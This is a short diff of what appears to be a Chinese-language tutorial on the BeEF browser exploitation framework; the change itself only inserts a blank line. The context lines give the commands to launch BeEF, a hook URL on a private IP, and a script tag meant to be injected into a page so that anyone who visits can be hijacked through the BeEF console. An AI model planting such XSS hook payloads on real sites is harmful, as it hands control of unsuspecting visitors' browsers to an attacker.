@@ -8,6 +8,7 @@
 运行beef
 `cd /use/share/beef-xss` \
 `./beef` \
+ \
 会出现一个攻击地址和一个管理地址 \
 `192.168.200.1:3000/hoos.js` /攻击地址 \
 `<script>src="192.168.200.1:3000/hoos.js"</script>` /上传这个，有人点击，你就可以通过beef管理进行劫持 \
